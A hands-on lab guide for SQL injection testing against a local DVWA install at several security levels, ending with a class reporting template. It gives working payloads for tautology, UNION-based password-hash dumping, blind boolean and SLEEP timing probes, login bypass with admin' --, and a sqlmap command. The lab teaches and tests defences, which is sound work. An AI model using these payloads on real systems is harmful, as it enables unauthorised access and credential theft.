# Practical SQL Injection Testing (DVWA Lab)

Hands-on steps for your running DVWA. Do everything on **localhost only**.

**Before you start**

1. http://localhost/DVWA/ — logged in as `admin` / `password`
2. http://localhost/DVWA/security.php — set **Low**
3. Open **SQL Injection** in the left menu

---

## Test 1 — Basic injection (you did this)

**Page:** SQL Injection → User ID box → Submit

| Step | Input | Expected result |
|------|--------|-----------------|
| 1 | `1` | One user (admin) |
| 2 | `2` | One user (Gordon Brown) |
| 3 | `1' OR '1'='1` | **All users** (admin, Gordon, Hack, Pablo, Bob) |

**What it proves:** Input changes the SQL `WHERE` clause logic.

**Screenshot tip:** Capture Test 1 vs Test 3 for your report.

---

## Test 2 — Union-based: dump passwords

Still on **SQL Injection (Low)**.

| Step | Input | Expected result |
|------|--------|-----------------|
| 1 | `1' UNION SELECT null,null-- ` | May error or empty — confirms 2 columns |
| 2 | `1' UNION SELECT user, password FROM users-- ` | List of usernames + MD5 hashes |
| 3 | Copy one hash | Crack with MD5 tool or compare to known DVWA hashes |

**Success criteria:** You see `password` column data you could not see with normal `id=1`.

**If it fails:**

- Add a space before `--`: `...users-- `
- Try: `1' UNION SELECT 1,2-- ` first to see if union works at all

---

## Test 3 — Error-based (optional)

| Input | Expected |
|--------|----------|
| `1'` | SQL error message (Low only) |
| `1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 1))-- ` | (MSSQL style — skip on MySQL) |

On MySQL Low, a lone `1'` often triggers `mysqli_error` output — useful for learning, not on Impossible.

---

## Test 4 — SQL Injection (Blind)

**Page:** SQL Injection (Blind)

| Step | Input | Expected |
|------|--------|----------|
| 1 | `1` | User ID exists |
| 2 | `999` | User ID is MISSING (404) |
| 3 | `1' AND '1'='1` | exists |
| 4 | `1' AND '1'='2` | missing |
| 5 | `1' AND SLEEP(5)-- ` | Page loads after ~5 second delay |

**Success criteria:** You can tell true/false (or time delay) without seeing names on the page.

**Manual extraction idea (advanced):**

```text
1' AND SUBSTRING(password,1,1)='5' AND '1'='1
```

Adjust character until “exists” — repeat for each position (tedious; use sqlmap for automation).

---

## Test 5 — Login bypass

**Page:** Brute Force (Low)

| Field | Value |
|--------|--------|
| Username | `admin' --` |
| Password | `x` (anything) |
| Click | Login |

**Expected:** “Welcome to the password protected area admin”

**Why:** SQL comment `--` removes the password check from the query.

---

## Test 6 — Medium level

1. Set security to **Medium** on security.php  
2. Open **SQL Injection** (form uses POST + dropdown)

Use browser DevTools **Network** tab or Burp to change POST `id` to:

```text
1 UNION SELECT user, password FROM users
```

(No single quotes — numeric context.)

**Expected:** Same password dump as Low union.

---

## Test 7 — Impossible level (defense check)

1. Set security to **Impossible**  
2. Retry: `1' OR '1'='1` and union payloads  

**Expected:** Injection should **not** work.

**Purpose:** Shows prepared statements / proper validation block the attack.

---

## Test 8 — sqlmap (optional automation)

Only against **your local** DVWA.

```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" --batch
```

Get `PHPSESSID` from browser cookies after login.

---

## Reporting template (for class / assignment)

For each test, record:

1. **Module** (SQLi / Blind / Brute Force)  
2. **Security level** (Low / Medium / …)  
3. **Payload** (exact string)  
4. **Result** (screenshot or description)  
5. **Impact** (e.g. “disclosed all password hashes”)  
6. **Fix** (prepared statements, input validation, least privilege DB user)

---

## File locations in your project

| File | Purpose |
|------|---------|
| `vulnerabilities/sqli/source/low.php` | Vulnerable code |
| `vulnerabilities/sqli/source/impossible.php` | Secure code |
| `vulnerabilities/sqli/source/secure_version.php` | Fixed example |
| `SQL_INJECTION_GUIDE.md` | Theory + payloads |
| This file | Step-by-step lab |

---

## Order to complete the lab

1. Test 1 — Basic (`1' OR '1'='1`) ✅ you finished this  
2. Test 2 — Union passwords  
3. Test 4 — Blind boolean + SLEEP  
4. Test 5 — Login bypass  
5. Test 6 — Medium  
6. Test 7 — Impossible (verify fix)

Good luck — start with **Test 2** on the same page you already used.
